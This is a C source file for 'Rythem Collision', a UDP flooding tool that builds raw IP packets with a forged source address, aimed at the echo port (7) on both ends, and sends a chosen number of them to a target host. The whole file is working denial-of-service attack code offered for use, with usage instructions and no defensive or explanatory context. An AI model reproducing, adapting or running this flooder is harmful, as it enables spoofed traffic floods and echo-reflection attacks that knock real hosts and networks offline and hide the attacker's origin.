

/* Rythem Collision UDP flooder. [v0.8]
   this code was taken bit by bit most of it is mine but i need help where
   i could get it. (wish i knew who made the original source =/).
   
   usage: rc <from host> <to host> <how many>
*/

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in_systm.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<errno.h>
#include<string.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<stdio.h>
#define VERSION_S "0.8"

struct sockaddr sa;

main(int argc,char **argv)
{
int fd;
int x=1;
struct sockaddr_in *p;
struct hostent *he;
int numpackets;
u_char gram[38]=
        {
        0x45,   0x00,   0x00,   0x26,
        0x12,   0x34,   0x00,   0x00,
        0xFF,   0x11,   0,      0,
        0,      0,      0,      0,
        0,      0,      0,      0,

        0,      0,      0,      0,
        0x00,   0x12,   0x00,   0x00,

        '1','2','3','4','5','6','7','8','9','0'
        };

fprintf(stderr, "Rythem Collision [v%s] -- Coded, Nso\n", VERSION_S);
if(argc!=4)
        {
        fprintf(stderr,"usage: rc <from host> <to host> <how many>\n");
        exit(1);
        };

numpackets = atoi(argv[3]);
if((he=gethostbyname(argv[1]))==NULL)
        {
        fprintf(stderr,"The source hostname _must_ be real.\n");
        exit(1);
        };
bcopy(*(he->h_addr_list),(gram+12),4);

if((he=gethostbyname(argv[2]))==NULL)
        {
        fprintf(stderr,"The destination hostname does not exist.n");
        exit(1);
        };
bcopy(*(he->h_addr_list),(gram+16),4);

*(u_short*)(gram+20)=htons((u_short)7);
*(u_short*)(gram+22)=htons((u_short)7);

p=(struct sockaddr_in*)&sa;
p->sin_family=AF_INET;
bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));

if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
        {
        perror("socket");
        exit(1);
        };

#ifdef IP_HDRINCL
fprintf(stderr,"IP_HDRINCL: found!\n");
if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
        {
        perror("setsockopt IP_HDRINCL");
        exit(1);
        };
#else
fprintf(stderr,"IP_HDRINCL: not found.\n");
#endif

for(x=0;x<numpackets;x++)
{
 if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)
        {
        perror("sendto");
        exit(1);
        };
  printf("."); 
  fflush(stdout);
 }
printf("\nnumber of packets sent: %d\n", x);
}

